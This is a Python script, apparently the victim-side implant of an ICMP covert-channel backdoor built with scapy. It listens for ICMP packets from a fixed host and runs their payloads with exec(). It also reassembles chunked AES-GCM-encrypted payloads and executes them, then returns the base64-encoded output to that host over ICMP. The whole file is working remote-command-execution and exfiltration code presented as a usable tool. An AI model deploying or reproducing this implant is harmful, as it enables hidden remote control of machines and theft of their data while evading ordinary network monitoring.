import contextlib
import io
import os
import sys
import threading
from time import sleep

from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from scapy.all import *

HOST_IP = "10.0.0.205"
FILLER_STRING = "\01"
DELIMITER = "\00"
RESEND_MESSGE_CODE = 9
CHUNK_MESSAGE_CODE = 3
CONTROL_MESSAGE_CODE = 1
FINISH_CODE = 2

fil = f"src host {HOST_IP} and icmp"

icmp_seq = 1
data_received = {}
complete_payload = ""
total_chunks = -1
chunks_recieved = set()
expected_chunks = set()

start_checking = False

with open("aes_key.bin", "rb") as key_file:
    symkey = key_file.read()


def handle_data_received(packet):
    global total_chunks, start_checking, expected_chunks
    if packet[ICMP].type == 0:
        print(packet)
        return
    # data_received.append(packet[Raw].load.decode("unicode_escape"))
    if Raw not in packet:
        return
    packet_data = packet[Raw].load
    print(f"packet decoded: {packet_data.decode()}")

    # Capture output of exec
    code = packet_data.decode()[3:]
    buffer = io.StringIO()
    try:
        with contextlib.redirect_stdout(buffer), contextlib.redirect_stderr(buffer):
            exec(code)
    except Exception as e:
        print(f"Exec error: {e}", file=buffer)

    output = buffer.getvalue()
    # Use context manager to redirect stdout

    if output:
        send_output(output)
    return
    if packet_data.decode()[0:3] == 000:
        exec(packet_data[3:])
        print("here")
        return

    print(packet_data)

    # first occurance of filler string
    try:
        headers, encrypted = packet_data.split(DELIMITER.encode(), 1)
    except Exception as e:
        print(str(e))
        # NO PADDING FOUND in packet_data
        print("NO PADDING FOUND in packet_data")
        return
    headers = headers.decode()
    message_type = int(headers[0])

    # recv actualy payload chunk
    if message_type == CHUNK_MESSAGE_CODE:
        # make sure total_chunk initialized first
        if total_chunks == -1:
            return
        chunk_index = int(headers[1:])
        data_received[chunk_index] = encrypted
        chunks_recieved.add(chunk_index)
        print(message_type, chunk_index)
        print(headers, encrypted)

    # recv first payload with chunks to expect
    elif message_type == CONTROL_MESSAGE_CODE:
        total_chunks = int(headers[1:])
        print("total ch", total_chunks)
        expected_chunks = set(range(0, total_chunks))
        print("recieved code 1", total_chunks)
    # recv final packet and then start checking each packets payload was receieved
    elif message_type == FINISH_CODE:
        print("Starting checking")
        start_checking = True
        return

    # decrypted_data = decrypt_chunk(packet_data)

    # data_received.append(packet[Raw].load)


MAX_MESSAGE_SIZE = 40


icmp_id = os.getpid() & 0xFFFF


def send_recover(missing: set[int]):
    global icmp_seq

    # the id comes from the current process id and doing a Internet checksum (used to identify the "session" or "process" sending the ping)
    # seq increments per sent packet, helps detect packet loss, track individual requests

    for chunk_index in missing:
        payload = f"{RESEND_MESSGE_CODE}{chunk_index}{DELIMITER}"
        full_payload = (
            f"{payload}{(MAX_MESSAGE_SIZE - len(payload)) * FILLER_STRING}".encode()
        )
        print("full payload", full_payload)

        icmp_packet = (
            IP(dst=HOST_IP) / ICMP(id=icmp_id, seq=icmp_seq) / Raw(load=full_payload)
        )

        resp = sr1(icmp_packet, verbose=0, timeout=3)

        icmp_seq += 1
        if resp:
            # got "ack" (icmp response back)
            pass
        else:
            return None


def decrypt_payload():
    sorted_chunks = dict(sorted(data_received.items()))
    payload_list = [chunk for chunk in sorted_chunks.values()]
    encrypted_data = b"".join(payload_list)
    print("payload list", payload_list)
    print("encrypted data:", encrypted_data)
    aesgcm = AESGCM(symkey)
    nonce = encrypted_data[:12]
    ciphertext = encrypted_data[12:]
    plaintext = aesgcm.decrypt(nonce, ciphertext, associated_data=None)
    return plaintext.decode()


stop_sniffing = False


def send_output(output: str):
    global icmp_seq
    print("output")
    print(output)
    icmp_packet = (
        IP(dst=HOST_IP)
        / ICMP(id=icmp_id, seq=icmp_seq)
        / Raw(load=base64.b64encode(output.encode()))
    )

    resp = sr1(icmp_packet, verbose=0, timeout=3)

    icmp_seq += 1


def sniffer():
    sniff(filter=fil, prn=handle_data_received, stop_filter=lambda p: stop_sniffing)


sniffer_thread = threading.Thread(target=sniffer, daemon=True)
sniffer_thread.start()

while True:
    sleep(1)

    if start_checking and total_chunks != -1:
        missing = expected_chunks - chunks_recieved
        if missing:
            print("Missing chunks:", missing)
            send_recover(missing)
        else:
            print("All chunks received.")
            stop_sniffing = True

    if stop_sniffing:
        total_payload = decrypt_payload()
        print(total_payload)
        # if type == "payload":
        # # Redirect stdout
        old_stdout = sys.stdout
        sys.stdout = buffer = io.StringIO()

        try:
            exec(total_payload)
        finally:
            sys.stdout = old_stdout  # Restore stdout
        output = buffer.getvalue()
        send_output(output)

        # else:
        # if cli

        stop_sniffing = False
        start_checking = False
        total_chunks = -1
